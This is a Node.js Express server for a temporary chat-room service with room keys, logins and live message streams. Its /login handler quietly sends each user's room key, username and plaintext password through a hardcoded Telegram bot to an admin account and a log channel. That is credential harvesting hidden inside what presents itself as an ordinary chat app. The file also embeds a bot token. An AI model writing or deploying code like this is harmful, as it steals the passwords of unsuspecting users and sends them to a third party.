const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = '8157449994:AAENXtv_w_gfBz36ZVD_DKLETHzYzpEvAAM';
const LOG_CHANNEL_ID = '-1002846991732';
const ADMIN_USER_ID = '7307633923';
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

app.use(express.json());
app.use(express.static(__dirname));

const rooms = {};
const usedUsernames = new Set(); // Tracks all usernames globally

function cleanExpiredRooms() {
  const now = Date.now();
  for (const key in rooms) {
    const room = rooms[key];
    if (room.expiresAt < now) {
      // Remove usernames of active users in this room from global tracker
      room.activeUsers.forEach(u => usedUsernames.delete(u));
      room.clients.forEach(res => res.end());
      delete rooms[key];
    } else {
      // Clean messages older than 24 hours
      room.messages = room.messages.filter(m => now - m.timestamp < 24 * 3600 * 1000);
    }
  }
}
setInterval(cleanExpiredRooms, 60000);

app.get('/generate-key', (req, res) => {
  const key = uuidv4().split('-')[0];
  const expiresAt = Date.now() + 24 * 60 * 60 * 1000;
  rooms[key] = { messages: [], clients: [], expiresAt, activeUsers: new Set() };
  res.json({ key });
});

app.get('/join-room/:key', (req, res) => {
  const room = rooms[req.params.key];
  if (!room || room.expiresAt < Date.now()) return res.json({ success: false });
  res.json({ success: true });
});

app.post('/login', async (req, res) => {
  const { key, username, password } = req.body;
  const room = rooms[key];
  if (!room || room.expiresAt < Date.now()) return res.json({ success: false });

  // Check global username uniqueness
  if (usedUsernames.has(username)) {
    return res.json({ success: false, message: 'Username already taken globally' });
  }

  const loginText = `🔐 New Login\nRoom: ${key}\nUsername: ${username}\nPassword: ${password}`;

  try {
    // Send login info to Telegram admin and log channel
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: ADMIN_USER_ID,
      text: loginText
    });

    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: LOG_CHANNEL_ID,
      text: loginText
    });

    // Mark username as used globally and add to this room's active users
    usedUsernames.add(username);
    room.activeUsers.add(username);

    res.json({
      success: true,
      expiresAt: new Date(room.expiresAt).toISOString(),
      history: room.messages.map(m => `${m.user}: ${m.message}`)
    });
  } catch (err) {
    console.error('Telegram error:', err.message);
    res.json({ success: false });
  }
});

app.post('/send-message', (req, res) => {
  const { key, user, message } = req.body;
  const room = rooms[key];
  if (!room) return res.status(404).end();

  const entry = { user, message, timestamp: Date.now() };
  room.messages.push(entry);
  const formatted = `${user}: ${message}`;
  room.clients.forEach(c => c.write(`data: ${formatted}\n\n`));
  res.end();
});

app.get('/stream/:key', (req, res) => {
  const room = rooms[req.params.key];
  if (!room) return res.status(404).end();

  const username = req.query.username;
  if (!username) return res.status(400).end();

  res.set({
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive'
  });

  res.write('\n');
  room.clients.push(res);

  // Handle disconnect: free username from active users & global tracker
  req.on('close', () => {
    room.clients = room.clients.filter(c => c !== res);
    if (room.activeUsers.has(username)) {
      room.activeUsers.delete(username);
      usedUsernames.delete(username);
    }
  });
});

app.listen(PORT, () => console.log(`✅ Server running on http://localhost:${PORT}`));
